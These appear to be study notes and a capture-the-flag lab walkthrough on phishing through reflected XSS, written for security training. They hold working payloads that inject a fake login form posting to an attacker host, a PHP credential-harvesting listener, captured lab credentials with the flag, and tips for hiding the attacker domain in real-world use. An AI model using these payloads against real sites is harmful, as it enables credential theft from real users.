# Section 7 — Phishing via XSS

---

## Attack Concept

Inject a fake login form into a trusted, vulnerable page. The form posts credentials to the attacker. The attacker then uses those credentials to log into the real app.

The victim trusts the URL and domain they see. They type credentials into what looks like a normal login prompt on a legitimate site.

---

## Full Attack Chain

```
1. Discover XSS in trusted target → craft payload with login form
2. Stand up listener that captures form submissions + redirects victim back
3. Send malicious URL to victim (phishing email, /send.php bot, etc.)
4. Victim clicks → fake login appears on trusted domain
5. Victim submits → credentials sent to attacker
6. Attacker logs into real admin panel
```

---

## Building the Payload

### 1. Find the breakout

The injection point dictates the payload prefix. For `<img src='<USER_INPUT>'>`:
```html
'><script>...</script><!--
```
- `'>` closes the `src` attribute and `<img>` tag
- `<script>` runs JS
- `<!--` comments out the rest of the original HTML

### 2. Login form via `document.write`

```javascript
document.write(
  '<h3>Please login to continue</h3>' +
  '<form action=http://ATTACKER_IP:PORT>' +
    '<input name="username" placeholder="Username">' +
    '<input name="password" placeholder="Password" type="password">' +
    '<input type="submit" value="Login">' +
  '</form>'
);
```
> Writes a fake login form directly into the page. Replace `ATTACKER_IP:PORT` with your tun0 IP and listener port. When the victim submits, the browser sends credentials to your server as a GET request.

### 3. Remove the original form so victim has nowhere else to interact

```javascript
document.getElementById('urlform').remove();
```
> Removes the original form element so the victim cannot interact with the real page. Find the element's `id` using DevTools (`Ctrl+Shift+C`) and clicking the element. Replace `urlform` with the actual id.

Identify the target element's `id` via DevTools `Ctrl+Shift+C` → click the element.

### 4. Combine into one payload

```html
'><script>document.write('<h3>Please login</h3><form action=http://10.10.17.176:8080><input name="username"><input name="password" type="password"><input type="submit" value="Login"></form>');document.getElementById('urlform').remove();</script><!--
```

URL-encode and append to the vulnerable parameter:
```
http://TARGET/index.php?url=%27%3E%3Cscript%3E...
```

---

## Credential Listener (PHP)

A netcat listener works but returns "Unable to connect" to the victim — suspicious. A PHP listener logs creds and silently redirects:

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://TARGET/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

Run with PHP's built-in server:
```bash
mkdir /tmp/listener && cd /tmp/listener
# write index.php with content above
php -S 0.0.0.0:8080         # port 80 needs sudo; 8080+ does not
```
> Starts PHP's built-in web server, listening on all interfaces on port 8080. Credentials will be logged to `creds.txt` in the same directory. Port 80 requires root; use 8080 or higher to avoid that.

> The redirect makes the victim land on the original page, so nothing looks suspicious.

---

## Lab — Phishing Attack

**Target:** `10.129.96.115` (HTB VPN required)

### Step 1 — Find XSS in `/phishing/index.php`

The `url` parameter goes straight into `<img src='...'>`. Probe:
```bash
curl -sk -G "http://10.129.96.115/phishing/index.php" \
  --data-urlencode "url='><script>alert(1)</script>"
# → <img src=''><script>alert(1)</script>'>
```
> Tests whether the `url` parameter is reflected raw into the page. The `'>` closes the `<img>` tag and breaks out to run the script. If the script tag appears in the response body, breakout is confirmed.

### Step 2 — Start the listener

```bash
mkdir -p /tmp/xss_phish
cat > /tmp/xss_phish/index.php << 'EOF'
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("/tmp/xss_phish/creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://10.129.96.115/phishing/index.php");
    fclose($file);
    exit();
}
?>
EOF
cd /tmp/xss_phish && php -S 0.0.0.0:8080 &
```
> Creates the credential-catcher PHP page and starts a background PHP server on port 8080 — swap the redirect target URL and listener port for your environment.

### Step 3 — Build malicious URL

```python
import urllib.parse
ip = '10.10.17.176:8080'   # attacker's tun0 IP
payload = ('\'><script>document.write(\'<h3>Please login to continue</h3>'
           '<form action=http://' + ip + '>'
           '<input name="username" placeholder="Username">'
           '<input name="password" placeholder="Password" type="password">'
           '<input type="submit" value="Login"></form>\');'
           'document.getElementById(\'urlform\').remove();</script><!--')
url = 'http://10.129.96.115/phishing/index.php?url=' + urllib.parse.quote(payload)
print(url)
```
> Builds and URL-encodes the fake-login-form injection payload into a ready-to-send link — swap the attacker IP:port and target URL for your environment.

### Step 4 — Send to the bot

```bash
URL=$(cat /tmp/malicious_url.txt)
curl -sk -X POST "http://10.129.96.115/phishing/send.php" \
  --data-urlencode "url=$URL"
# → "URL Sent!"
```
> Reads the malicious URL from file, then POSTs it to the lab's send endpoint. The bot visits the URL, sees the fake login form, and submits credentials to your listener.

### Step 5 — Harvest credentials

Listener log:
```
10.129.96.115 [302]: GET /?username=admin&password=p1zd0nt57341myp455&submit=Login
```

`creds.txt`:
```
Username: admin | Password: p1zd0nt57341myp455
```

### Step 6 — Log in to `/phishing/login.php`

```bash
curl -sk -X POST "http://10.129.96.115/phishing/login.php" \
  --data-urlencode "username=admin" \
  --data-urlencode "password=p1zd0nt57341myp455"
# → HTB{r3f13c73d_cr3d5_84ck_2_m3}
```
> Logs into the real app using the stolen credentials. Replace the username and password with whatever you captured in `creds.txt`.

**Flag:** `HTB{r3f13c73d_cr3d5_84ck_2_m3}`

---

## Exam Notes

- The breakout payload depends entirely on the injection context — `<img src='X'>` needs `'>`, `<input value="X">` needs `">`, raw HTML needs nothing
- Always remove the original form element (`.remove()`) so the victim has only your fake form to interact with
- Trailing `<!--` cleans up leftover original HTML; without it, broken tags may visually leak the attack
- The redirect in the PHP listener is critical — silent success > "site unreachable" error
- Port 80 needs root; use 8080+ on Kali to avoid sudo
- Real-world: the attacker domain in `form action=` is the giveaway — use a typosquatted domain or HTTPS-on-same-origin trick if possible
- This exact attack pattern was used against TweetDeck (2014) and continues to work today on apps that echo URL params into image/iframe attributes
